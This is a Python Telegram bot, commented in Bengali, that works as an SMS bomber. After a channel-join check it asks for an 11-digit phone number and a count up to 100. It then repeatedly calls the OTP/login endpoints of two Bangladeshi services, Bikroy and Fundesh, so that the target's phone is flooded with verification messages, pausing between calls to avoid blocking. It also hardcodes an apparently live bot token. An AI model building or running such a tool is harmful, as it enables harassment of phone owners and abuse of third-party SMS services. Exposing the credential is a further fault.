import telebot
import requests
import time
from telebot import types
from flask import Flask
from threading import Thread

# ১. সেটিংস - আপনার নতুন টোকেন
API_TOKEN = '8678067992:AAH-gaEdP_KdS47FefM1G-Tl5HI0Wb1PQHM'
CHANNEL_USERNAME = '@developer_of_maruf' 

bot = telebot.TeleBot(API_TOKEN)
user_data = {}

# ২. সার্ভার সচল রাখার জন্য Flask
app = Flask('')
@app.route('/')
def home(): return "Bot is Online!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

def check_join(chat_id):
    try:
        # বোটকে অবশ্যই চ্যানেলের অ্যাডমিন হতে হবে
        status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

# ৩. কমান্ড হ্যান্ডলার
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    if check_join(chat_id):
        bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল!**", parse_mode="Markdown")
        msg = bot.send_message(chat_id, "🚀 SMS পাঠাতে এখন নাম্বারটি দিন (১১ ডিজিট):")
        bot.register_next_step_handler(msg, get_number)
    else:
        # জয়েন বাটন এবং ভেরিফাই বাটন
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf"))
        markup.add(types.InlineKeyboardButton("🔄 Verify Done", callback_data="verify_join"))
        bot.send_message(chat_id, "❌ বোটটি ব্যবহার করতে আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    if check_join(call.message.chat.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        welcome(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ এখনো জয়েন হননি!", show_alert=True)

# ৪. বোম্বিং প্রসেস
def get_number(message):
    if message.text == "/start":
        welcome(message)
        return
    if not message.text.isdigit() or len(message.text) < 11:
        msg = bot.send_message(message.chat.id, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
    user_data[message.chat.id] = message.text
    msg = bot.send_message(message.chat.id, "🔢 কতটি SMS পাঠাতে চান? (সর্বোচ্চ ১০০)")
    bot.register_next_step_handler(msg, send_bomber)

def send_bomber(message):
    try:
        amount = int(message.text)
        num = user_data[message.chat.id]
        if amount > 100: amount = 100 
        
        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")
        
        for i in range(amount):
            try:
                # API 1: Bikroy
                requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
                # API 2: Fundesh
                requests.get(f"https://fundesh.com.bd/api/auth/send-otp?phone={num}", timeout=5)
                # ব্লক হওয়া এড়াতে বিরতি
                time.sleep(1.5) 
            except:
                continue
                
        bot.send_message(message.chat.id, "✅ কাজ শেষ! আবার পাঠাতে /start দিন।")
    except:
        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা লিখুন।")

if __name__ == "__main__":
    keep_alive()
    # সার্ভারে কনফ্লিক্ট এড়াতে skip_pending=True জরুরি
    bot.infinity_polling(skip_pending=True)
